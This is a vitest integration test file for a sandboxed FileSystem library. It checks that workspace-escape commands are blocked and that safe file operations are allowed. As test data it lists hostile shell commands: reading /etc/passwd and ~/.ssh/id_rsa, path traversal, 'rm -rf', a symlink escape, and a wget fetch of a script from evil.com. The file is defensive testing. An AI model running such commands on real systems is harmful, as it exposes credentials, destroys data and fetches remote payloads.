import { describe, expect, it, beforeAll, afterAll } from 'vitest'
import { FileSystem } from '../src/index.js'

describe('Security Integration Tests', () => {
  let fs: FileSystem
  
  beforeAll(async () => {
    fs = new FileSystem({ userId: 'security-integration-test' })
    // Create a test file for safe operations
    await fs.write('safe-file.txt', 'This is a safe file in the workspace')
  })

  afterAll(async () => {
    // Clean up test files
    try {
      await fs.exec('rm -f safe-file.txt test.txt')
      await fs.exec('rmdir subdir || true')
    } catch {
      // Ignore cleanup errors
    }
  })

  describe('Security Attack Prevention', () => {
    const securityAttacks = [
      {
        name: 'Absolute path access',
        command: 'cat /etc/passwd'
      },
      {
        name: 'Parent directory traversal', 
        command: 'cat ../../../../../../etc/passwd'
      },
      {
        name: 'Directory change attempt',
        command: 'cd /tmp && rm -rf *'
      },
      {
        name: 'Home directory access',
        command: 'cat ~/.ssh/id_rsa'
      },
      {
        name: 'Environment manipulation',
        command: 'export HOME=/etc && cat $HOME/passwd'
      },
      {
        name: 'Network command',
        command: 'wget http://evil.com/malware.sh'
      },
      {
        name: 'Symlink escape attempt',
        command: 'ln -s /etc/passwd link && cat link'
      },
      {
        name: 'Command substitution',
        command: 'echo $(cat /etc/passwd)'
      }
    ]

    it.each(securityAttacks)('should block $name', async ({ command }) => {
      await expect(fs.exec(command)).rejects.toThrow()
    })

    it('should prevent multiple attack vectors in one test', async () => {
      // Test that all attacks are blocked
      const results = await Promise.allSettled(
        securityAttacks.map(attack => fs.exec(attack.command))
      )

      // All should be rejected (blocked)
      expect(results.every(result => result.status === 'rejected')).toBe(true)
    })
  })

  describe('Safe Operations', () => {
    const safeOperations = [
      { desc: 'List files', cmd: 'ls -la' },
      { desc: 'Read safe file', cmd: 'cat safe-file.txt' },
      { desc: 'Create directory', cmd: 'mkdir -p subdir' },
      { desc: 'Echo to file', cmd: 'echo "test" > test.txt' },
      { desc: 'Read created file', cmd: 'cat test.txt' }
    ]

    it.each(safeOperations)('should allow $desc', async ({ cmd }) => {
      await expect(fs.exec(cmd)).resolves.not.toThrow()
    })

    it('should allow file operations within workspace', async () => {
      // Test a sequence of safe operations
      await fs.exec('mkdir -p safe-subdir')
      await fs.write('safe-subdir/nested-file.txt', 'nested content')
      const content = await fs.read('safe-subdir/nested-file.txt')
      
      expect(content).toBe('nested content')
      
      // Clean up
      await fs.exec('rm -rf safe-subdir')
    })
  })

  describe('File Operations Security', () => {
    it('should block reading files outside workspace', async () => {
      await expect(fs.read('/etc/passwd')).rejects.toThrow('Absolute paths are not allowed')
      await expect(fs.read('../../../etc/passwd')).rejects.toThrow('Path escapes workspace')
    })

    it('should block writing files outside workspace', async () => {
      await expect(fs.write('/tmp/malicious.txt', 'bad')).rejects.toThrow('Absolute paths are not allowed')
      await expect(fs.write('../../../tmp/escape.txt', 'bad')).rejects.toThrow('Path escapes workspace')
    })

    it('should allow safe file operations', async () => {
      await expect(fs.write('safe-test.txt', 'safe content')).resolves.not.toThrow()
      await expect(fs.read('safe-test.txt')).resolves.toBe('safe content')
      
      // Clean up
      await fs.exec('rm -f safe-test.txt')
    })
  })

  describe('Command Context Security', () => {
    it('should execute commands in correct workspace', async () => {
      const pwd = await fs.exec('pwd')
      expect(pwd).toBe(fs.workspace)
    })

    it('should block environment variable access for security', async () => {
      // Our security blocks $HOME access to prevent escapes
      await expect(fs.exec('echo $HOME')).rejects.toThrow('escape workspace')
    })

    it('should prevent changing working directory', async () => {
      await expect(fs.exec('cd /')).rejects.toThrow()
      
      // Verify we're still in workspace after failed cd attempt
      const pwd = await fs.exec('pwd')
      expect(pwd).toBe(fs.workspace)
    })
  })

  describe('Error Messages', () => {
    it('should provide informative error messages for security violations', async () => {
      try {
        await fs.exec('cat /etc/passwd')
        expect.fail('Should have thrown an error')
      } catch (error: any) {
        expect(error.message).toContain('escape workspace')
      }

      try {
        await fs.exec('wget http://evil.com/file')
        expect.fail('Should have thrown an error')
      } catch (error: any) {
        expect(error.message).toContain('Network command')
      }
    })
  })
})